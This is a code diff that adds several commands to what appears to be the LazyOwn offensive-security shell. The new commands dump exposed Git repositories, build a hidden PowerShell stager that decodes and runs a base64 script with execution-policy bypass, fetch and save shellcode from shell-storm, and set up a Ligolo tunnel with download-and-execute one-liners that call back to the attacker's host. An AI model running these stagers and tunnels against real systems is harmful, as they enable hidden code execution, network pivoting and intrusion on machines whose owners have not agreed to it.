@@ -93,6 +93,7 @@ class LazyOwnShell(Cmd):
         "q": "exit",
         "rtpflood" : "sh sudo bash modules/lazyrtpflood.sh",
         "tor": "sh sudo bash sessions/tor.sh",
+        "ses": "sh ls sessions",
         "sniff": "run lazysniff",
         "venom": "run lazymsfvenom",
         "wps":"sh sudo bash modules/lazywps.sh",
@@ -11618,6 +11619,166 @@ class LazyOwnShell(Cmd):
         print_msg(f"Generated command: {command}")
         os.system(command)
         return
+
+    def do_gitdumper(self, line):
+        """
+        Install and execute the git-dumper tool to download Git repository content.
+
+        This function checks if git-dumper is installed, and if not, installs it using pip.
+        Then, it prompts the user to input the necessary parameters to run git-dumper, constructs
+        the command, and executes it.
+
+        :param line: Not used in this implementation.
+        :returns: None
+        """
+        url = self.params["url"]
+        if not is_package_installed("git-dumper"):
+            print_warn("git-dumper not found. Installing...")
+            os.system("pip install git-dumper")
+
+        if not line:
+            repo_url = input(f"Enter the Git repository URL (e.g., default: {url}").strip() or url
+        if not repo_url:
+            print_error("Repository URL is required.")
+            return
+        path = os.getcwd()
+        domain = get_domain(repo_url)
+        output_dir = f"{path}/sessions/{domain}"
+        if not output_dir:
+            print_error("Output directory is required.")
+            return
+        command = f"git-dumper {repo_url} {output_dir}"
+        print_msg(f"Executing command: {command}")
+        os.system(command)
+        return
+
+    def do_powershell_cmd_stager(self, line):
+        """
+        Generate and execute a PowerShell command stager to run a .ps1 script.
+
+        This function takes the name of a PowerShell script (.ps1), encodes its content in base64,
+        and constructs a command to execute the script using PowerShell in a hidden and elevated manner.
+        The function then prints the generated command.
+
+        :param line: The name of the PowerShell script file to encode and execute.
+        :returns: None
+        """
+        if not line:
+            print_error("PowerShell script file name is required and exist in sessions directory!")
+            return
+        path = os.getcwd()
+        sessions = f"{path}/sessions/"
+        script_file = line.strip()
+        fullpath_script_file = f"{sessions}{script_file}"
+        try:
+            with open(fullpath_script_file, 'r') as file:
+                script_content = file.read()
+        except FileNotFoundError:
+            print_error(f"File not found: {fullpath_script_file}")
+            return
+        except IOError as e:
+            print_error(f"Error reading file {fullpath_script_file}: {str(e)}")
+            return
+
+        script_encoded = base64.b64encode(script_content.encode("utf-8")).decode("utf-8")
+        cmd_stager = f"""
+        %comspec% /b /c start /b /min powershell -nop -ep bypass -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{script_encoded}')))"
+        """
+        print_msg(f"Generated command:\n")
+        copy2clip(cmd_stager)
+        return
+
+    def do_shellcode_search(self, line):
+        """
+        Search the shell-storm API for shellcodes using the provided keywords.
+
+        This function sends a GET request to the shell-storm API with the specified keywords.
+        It then prints the results.
+
+        :param line: A string containing the keywords to search for.
+        :returns: None
+        """
+        if not line:
+            line = input("Enter keywords for shellcode search (default: 'aix'): ") or 'aix'
+
+        keywords = line.strip().replace(' ', '*')
+        url = f"http://shell-storm.org/api/?s={keywords}"
+
+        try:
+            response = requests.get(url).text.splitlines()
+            if response:
+                print_msg(f"[*] {len(response)} results found")
+                for shellcode in response:
+                    sc = shellcode.split('::::')
+                    print_msg(f"Title: {sc[2]}, Platform: {sc[1]}, ID: {sc[3]}, Author: {sc[0]}, URL: {sc[4]}")
+                
+                shellcode_id = input("[*] Select shellcode id: ")
+                subprocess.call("clear", shell=True)
+                shellcode_url = f"http://shell-storm.org/shellcode/files/shellcode-{shellcode_id}.html"
+                shellcode_response = requests.get(shellcode_url).text
+                shellcode_response = shellcode_response.replace("&quot;", '"')
+                shellcode = extract(shellcode_response, False)
+                shellcode = clean_html(shellcode)
+                print_msg(shellcode)
+                
+                write_to_file = input("Do you want to write the shellcode to a file? (y/n): ").strip().lower()
+                if write_to_file == 'y':
+                    path = os.getcwd()
+                    sessions = f"{path}/sessions/"
+                    file_name = input("Enter file name to save shellcode: ") or 'shellcode'
+                    full_name = f"{sessions}{file_name}"
+                    with open(full_name, "w+") as fil:
+                        fil.write(shellcode)
+                    print_msg(f"[*] Wrote shellcode #{shellcode_id} to {file_name}")
+            else:
+                print_warn("No results found.")
+        except Exception as e:
+            print_error(f"An error occurred while performing the search: {e}")
+
+    def do_ligolo(self, line):
+        """
+        Automates the setup and execution of Ligolo server and client for tunneling and port forwarding.
+        
+        ...
+
+        :param line: The command line input containing the port number for Ligolo setup.
+        :type line: str
+        :returns: None
+        """
+        
+        lhost = self.params.get("lhost")
+        if not lhost:
+            print_error("You must set lhost ex: set lhost 10.10.10.10 or payload (alias p)")
+            return
+
+        if not line:
+            print_error("You must pass the port by argument ex: ligolo 3333")
+            return
+
+        ligolo_server_path = "sessions/proxy"
+        ligolo_client_path = "sessions/agent.exe"
+        if not os.path.exists(ligolo_server_path) or not os.path.exists(ligolo_client_path):
+            print_warn("Ligolo files not found. Downloading...")
+            os.system("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -P sessions/")
+            os.system("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -P sessions/")
+            os.system("wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -P sessions/")
+            os.system("cd sessions && unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip && tar -vzxf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz && tar -vzxf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz")
+        os.system("sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up")
+        lport = line.strip()
+        command_win = f"iwr -uri http://{lhost}/agent.exe -OutFile a.exe; .\\a.exe -connect {lhost}:{lport}"
+        command_linux = f"curl http://{lhost}/agent -o a; chmod +x a; ./a -connect {lhost}:{lport}"
+        
+        print_msg(f"Windows Command: {command_win}\nLinux Command: {command_linux}")
+        choice = input("Enter 1 to windows or 2 to linux: ")
+        if choice == "1":
+            copy2clip(command_win)
+        elif choice == "2":
+            copy2clip(command_linux)
+        else:
+            print_warn("Unrecognized choice. Please select either option 1 or 2.")
+
+        os.system(f"cd sessions && ./proxy -laddr \"0.0.0.0:{lport}\" -selfcert")
+        print_msg(f"Ligolo server is running on port {RED}{lport}{RESET}. You can stop it by terminating the process.")
 
 
 if __name__ == "__main__":
